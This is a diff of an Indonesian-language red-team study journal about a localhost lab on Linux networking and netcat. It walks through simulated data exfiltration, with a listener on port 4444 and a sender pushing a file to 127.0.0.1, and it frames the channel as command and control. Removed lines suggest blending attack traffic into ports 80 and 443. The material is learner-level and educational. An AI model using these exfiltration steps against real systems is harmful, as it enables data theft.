@@ -1,61 +1,53 @@
-# 🌐 Day 5: Linux Networking & Command Control
+# Day 5: Linux Networking & Command Control
 
 **Status:** Completed ✅
 
-**Fokus:** Networking Basics, Port Handling, dan Data Exfiltration menggunakan Netcat.
+**Focus:** Networking Basics (IP/Port), Netcat, & Data Exfiltration Simulation.
 
----
+## 🎯 Tujuan Belajar
 
-## 📖 1. Teori Dasar (Red Team Context)
+Memahami bagaimana komputer berkomunikasi dalam jaringan dan bagaimana seorang Red Teamer membangun jalur komunikasi (Command & Control) sederhana antara mesin penyerang dan korban.
 
-Hari ini saya belajar bahwa "Hacking tanpa Networking itu mustahil". Sebagai Red Teamer, kita harus paham bagaimana cara membuka jalur komunikasi antara komputer penyerang dan korban.
+> ⚠️ **Disclaimer:** Semua aktivitas "penyadapan" dan transfer data di bawah ini dilakukan secara lokal (localhost) untuk tujuan edukasi pemahaman protokol jaringan. Tidak ada sistem pihak ketiga yang dirugikan.
 
-### Konsep Kunci:
-* **IP Address (`ip addr`):** Alamat identitas mesin. Penting untuk diketahui agar payload/malware tahu harus "menelepon" ke mana.
-* **Ports (`ss -antp`):** Pintu masuk layanan.
-    * *Listening:* Status di mana port terbuka dan menunggu koneksi.
-    * *Red Team Note:* Kita sering menggunakan port umum (80, 443) agar traffic serangan terlihat seperti traffic browsing biasa.
-* **Netcat (`nc`):** Alat "Swiss Army Knife" untuk jaringan. Bisa digunakan untuk chatting, debugging, hingga mengirim file secara manual.
+## 🛠️ Tools & Command Baru
 
----
+| Command | Fungsi | Kategori |
+| :--- | :--- | :--- |
+| `ip addr` | Melihat identitas diri (IP Address) interface jaringan. | Reconnaissance |
+| `ss -antp` | Melihat port yang sedang terbuka (*Listening*) di komputer. | Reconnaissance |
+| `nc -lvnp` | **Netcat Listener**. Membuka port untuk menunggu koneksi masuk. | Command & Control |
+| `nc <ip> <port>` | **Netcat Connect**. Menghubungi komputer lain melalui port tertentu. | Connectivity |
+| `>` / `<` | **Redirection**. Mengarahkan output ke file atau input dari file. | File System |
 
-## 🛠️ 2. Lab Practice: Manual Data Exfiltration
+## 📝 Jurnal Praktek
 
-**Misi:** Mensimulasikan pencurian data dari komputer korban (Sender) ke komputer penyerang (Receiver/Listener) menggunakan protokol TCP sederhana.
+### 1. Masalah & Troubleshooting (The Struggle)
 
-### 🚩 Fase Troubleshooting (The Struggle)
-Awalnya, praktik ini tidak berjalan mulus. Saya menemui beberapa error logis dan permission.
+Saat mencoba melakukan simulasi pencurian data (*Data Exfiltration*), saya mengalami beberapa kendala teknis yang membuat transfer gagal.
 
 ![Error Permission](../images/error-permission.png)
 
-**Analisis Kesalahan Saya:**
-1.  **`Permission denied`:** Saya mencoba menyuruh Netcat menulis output ke file `rahasia.txt`. Ternyata file tersebut sudah ada sebelumnya (mungkin bekas eksperimen user root/lain), sehingga user saya (`adrian-dwi`) dilarang menimpanya.
-2.  **Syntax Error (`usage: nc ...`):** Saat mencoba mengirim file (`< data-penting.txt`), saya lupa memasukkan **IP Tujuan** dan **Port**. Komputer bingung harus mengirim paket ini ke mana.
-3.  **Netcat Hang:** Saya sempat bingung kenapa terminal tidak merespons, ternyata saya masih di dalam mode koneksi (belum menekan `Ctrl+C`).
+* **Error 1:** `bash: rahasia.txt: Permission denied`.
+    * **Penyebab:** Saya mencoba menyimpan data ke file `rahasia.txt` yang ternyata sudah ada dan dimiliki oleh user lain (root), sehingga user saya tidak punya izin tulis.
+* **Error 2:** `usage: nc ...` (Syntax Error).
+    * **Penyebab:** Pada terminal pengirim (kanan), saya lupa memasukkan **IP Tujuan** dan **Port**. Saya hanya mengetik `nc < data-penting.txt`, sehingga Netcat bingung harus mengirim ke mana.
 
----
+### 2. Solusi & Hasil Akhir (Success)
 
-### ✅ Fase Keberhasilan (Success)
-Setelah memahami error tersebut, saya melakukan perbaikan langkah:
+Setelah menganalisis error tersebut, saya melakukan perbaikan langkah:
+1.  **Reset:** Menghapus file yang bermasalah menggunakan `sudo rm rahasia.txt`.
+2.  **Listener (Penerima):** Menjalankan ulang perintah `nc -lvnp 4444 > rahasia.txt` (Mode dengar).
+3.  **Sender (Pengirim):** Memperbaiki perintah menjadi `nc 127.0.0.1 4444 < data-penting.txt` (Menyebutkan IP & Port dengan jelas).
 
-1.  **Reset Environment:** Menghapus file yang macet permissions-nya (`sudo rm rahasia.txt`).
-2.  **Listener (Penerima):** Menjalankan `nc -lvnp 4444 > rahasia.txt` (Mode dengar).
-3.  **Sender (Pengirim):** Menjalankan `nc 127.0.0.1 4444 < data-penting.txt` (Mode kirim ke localhost).
-
-![Permission Success](../images/permission-succes.png)
+![Permissioin Success](../images/permission-succes.png)
 
 **Hasil:**
-File `data-penting.txt` yang berisi pesan *"Ini adalah pesan rahasia dari agen 009"* berhasil ditransfer dan dibaca di terminal penerima. Ini membuktikan jalur Command & Control (C2) berhasil dibuat.
+File `data-penting.txt` berisi pesan rahasia berhasil dikirim dari terminal kanan dan diterima utuh di terminal kiri (`rahasia.txt`). Ini membuktikan bahwa jalur komunikasi (C2) berhasil dibangun.
 
 ---
 
-## 📝 Key Takeaways (Catatan Penting)
-
-1.  **Ctrl + C is King:** Jika terjebak di dalam perintah yang "hang" atau diam saja (seperti Netcat listener), gunakan `Ctrl + C` untuk mematikan prosesnya.
-2.  **Cek Permissions:** Sebelum menulis output ke file (`> file.txt`), pastikan kita punya hak akses di folder/file tersebut.
-3.  **Urutan Netcat:** Nyalakan **Listener** dulu, baru jalankan **Connect** di sisi pengirim. Jika tidak ada yang mendengar, pengirim akan error `Connection refused`.
-
----
-
-**Next Steps:**
-Lanjut ke **Day 6: Bash Scripting** untuk mengotomatisasi perintah-perintah network ini menjadi satu tools recon sederhana.
+### 💡 Key Takeaways
+1.  **Cek Permissions:** Sebelum melakukan *pipe* output (`>`), pastikan kita memiliki hak akses di folder/file tujuan.
+2.  **Teliti Syntax:** Netcat membutuhkan alamat tujuan (IP & Port) yang jelas saat dalam mode *connect*.
+3.  **Ctrl+C:** Selalu gunakan `Ctrl+C` jika proses terminal macet atau *hang* (menunggu koneksi).
